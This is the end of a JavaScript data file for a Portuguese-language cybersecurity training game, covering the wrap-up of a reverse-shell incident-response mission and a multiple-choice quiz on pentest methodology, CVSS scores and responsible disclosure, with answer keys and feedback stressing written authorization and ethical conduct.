      o_que_aconteceu: "Um reverse shell foi instalado via vetor desconhecido no servidor de pagamentos. O atacante acessou credenciais do banco de dados, potencialmente expondo dados de 47.000 clientes. A resposta correta evita danos adicionais e cumpre obrigações legais.",
      vulnerabilidade: "Ausência de EDR para detecção precoce, sem segmentação adequada de rede, credenciais em arquivo de configuração não criptografado.",
      risco: "Violação de dados financeiros e pessoais de 47.000 clientes, obrigações regulatórias (LGPD 72h, Banco Central), danos reputacionais e financeiros.",
      como_corrigir: "1. Desenvolver e treinar Plano de Resposta a Incidentes (IRP)\n2. Implementar SIEM + SOC 24/7\n3. EDR em todos os servidores\n4. Segmentação de rede (servidor de pagamentos isolado)\n5. Credenciais em vault (HashiCorp Vault, AWS Secrets Manager)\n6. Simular incidentes regularmente (tabletop exercises)",
      boa_pratica: "Framework NIST SP 800-61: Preparação → Detecção → Contenção → Erradicação → Recuperação → Lições Aprendidas. LGPD Art. 48: notificação obrigatória em 72h. Preservação forense ANTES de qualquer limpeza. Comunicação com stakeholders (jurídico, comunicação, C-level) desde o início."
    }
  },

  // ─── MISSÃO 18 ────────────────────────────────────────────────────────────
  {
    id: 18,
    titulo: "Metodologia de Pentest",
    subtitulo: "Dominando a metodologia profissional de testes de invasão",
    dificuldade: "Médio",
    tipo: "multipla_escolha",
    pontos_maximos: 150,
    icone: "📋",
    contexto: `<strong>Metodologia de Pentest Profissional</strong>
<br><br>
Um <strong>pentest (penetration test)</strong> é uma tentativa autorizada e controlada de comprometer sistemas
para identificar vulnerabilidades antes que atacantes reais o façam.
<br><br>
<strong>As 5 fases do pentest (PTES/OWASP):</strong><br>
<code>1. Reconhecimento</code> — coleta de informações (OSINT, DNS, WHOIS)<br>
<code>2. Varredura</code> — identificação de sistemas e serviços ativos<br>
<code>3. Enumeração</code> — identificação de vulnerabilidades específicas<br>
<code>4. Exploração</code> — tentativa controlada de explorar vulnerabilidades<br>
<code>5. Relatório</code> — documentação com evidências e recomendações<br>
<br>
<strong>CVSS — Common Vulnerability Scoring System:</strong><br>
• 0.0: Nenhum | 0.1–3.9: Baixo | 4.0–6.9: Médio | 7.0–8.9: Alto | 9.0–10.0: Crítico<br>
<br>
<strong>Responsible Disclosure (divulgação responsável):</strong><br>
Ao descobrir uma vulnerabilidade em sistema de terceiros sem autorização, o padrão ético é
notificar o responsável antes de publicar — prazo padrão da indústria: <strong>90 dias</strong>.`,
    dica: "Leia o briefing acima com atenção — as perguntas testam seu conhecimento sobre metodologia, CVSS e ética profissional.",
    perguntas: [
      {
        id: 1,
        texto: "Antes de iniciar qualquer pentest, qual documento é OBRIGATÓRIO para garantir que o trabalho é legal e protege tanto o pentester quanto o cliente?",
        opcoes: [
          { id: "a", texto: "Apenas um e-mail de autorização informal do cliente é suficiente" },
          { id: "b", texto: "Contrato formal com escopo detalhado (sistemas autorizados, janela de tempo, metodologia), NDA (non-disclosure agreement) e Regras de Engajamento (Rules of Engagement)" },
          { id: "c", texto: "Nenhum documento é necessário se o pentester for certificado" },
          { id: "d", texto: "Apenas o relatório final precisa ser documentado — o processo em si não" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! Sem contrato formal e escopo definido, o pentest é tecnicamente invasão de sistemas (crime pelo Art. 154-A do Código Penal). O escopo define exatamente o que pode ser testado — testar sistemas fora do escopo é ilegal mesmo com contrato.",
        feedback_errado: "E-mail informal não tem valor jurídico suficiente. O contrato formal com escopo preciso é o que separa pentest legal de invasão criminosa. Ele deve especificar: sistemas autorizados, janela de tempo, técnicas permitidas e responsabilidades."
      },
      {
        id: 2,
        texto: "Durante um pentest autorizado, você descobre uma vulnerabilidade com score CVSS 9.8 (Remote Code Execution sem autenticação). Qual ação imediata é esperada de um pentester profissional?",
        opcoes: [
          { id: "a", texto: "Explorar ao máximo para coletar o maior número de evidências possível antes de reportar" },
          { id: "b", texto: "Notificar o cliente imediatamente (out-of-band) mesmo que o pentest ainda esteja em andamento — vulnerabilidades críticas não podem aguardar o relatório final" },
          { id: "c", texto: "Ignorar e incluir apenas no relatório final — o cliente contratou o relatório completo" },
          { id: "d", texto: "Publicar a vulnerabilidade nas redes sociais para pressionar o cliente a corrigir" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! CVSS 9.8 = Crítico. Comunicação imediata é obrigação profissional: o cliente pode estar sob ataque ativo e cada hora importa. Boas práticas de pentest incluem escalada urgente para findings críticos — o relatório final vem depois, a notificação urgente vem primeiro.",
        feedback_errado: "Vulnerabilidades críticas exigem notificação imediata ao cliente — não é necessário esperar o relatório final. CVSS 9.8 significa impacto máximo: execução remota de código sem autenticação. O cliente precisa saber agora para poder tomar decisões de mitigação urgente."
      },
      {
        id: 3,
        texto: "Você encontrou uma vulnerabilidade grave em um site de banco que você NÃO foi contratado para testar. Qual é a conduta ética correta segundo o princípio de Responsible Disclosure?",
        opcoes: [
          { id: "a", texto: "Explorar a vulnerabilidade para provar que é real, depois notificar o banco" },
          { id: "b", texto: "Notificar o banco de forma privada e responsável, dar prazo de 90 dias para correção, e só publicar após o prazo — sem explorar, sem publicar antes do prazo" },
          { id: "c", texto: "Publicar imediatamente nas redes sociais para forçar correção rápida" },
          { id: "d", texto: "Ignorar completamente — não é problema seu se não foi contratado" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! Responsible Disclosure: notificação privada → prazo para correção (padrão: 90 dias) → publicação após correção ou expiração do prazo. Explorar sem autorização é crime (Art. 154-A) mesmo sendo para 'testar'. Programas de Bug Bounty existem exatamente para isso — permitem encontrar e reportar legalmente.",
        feedback_errado: "Explorar a vulnerabilidade sem autorização é crime independente das intenções. A conduta ética é: notificar o responsável de segurança do banco de forma privada, dar 90 dias para correção, e publicar apenas depois. Muitos bancos têm programas de bug bounty que permitem reporte legal e recompensas."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A metodologia de pentest profissional é o que diferencia um ethical hacker de um criminoso: autorização formal, escopo definido, conduta ética em todas as fases, comunicação de findings críticos imediata, e relatório documentado com recomendações construtivas.",
      vulnerabilidade: "Pentests sem metodologia adequada são tanto ineficazes (não cobrem superfícies de ataque relevantes) quanto arriscados (falta de documentação expõe o pentester e o cliente legalmente).",
      risco: "Pentest mal conduzido pode: causar indisponibilidade de sistemas em produção, expor o pentester a processos criminais, gerar responsabilidade civil para o cliente, e deixar vulnerabilidades críticas sem serem encontradas.",
      como_corrigir: "Certificações relevantes: CEH (Certified Ethical Hacker), OSCP (Offensive Security Certified Professional), eJPT (eLearnSecurity Junior Penetration Tester — recomendado para iniciantes), CompTIA PenTest+.",
      boa_pratica: "Frameworks: PTES (Penetration Testing Execution Standard), OWASP Testing Guide, NIST SP 800-115. Ferramentas: Kali Linux, Metasploit (com autorização), Burp Suite, Nmap, Nikto. Regra fundamental: a autorização escrita é o que separa pentest de invasão — sem ela, é crime."
    }
  }
];

module.exports = missionsData;
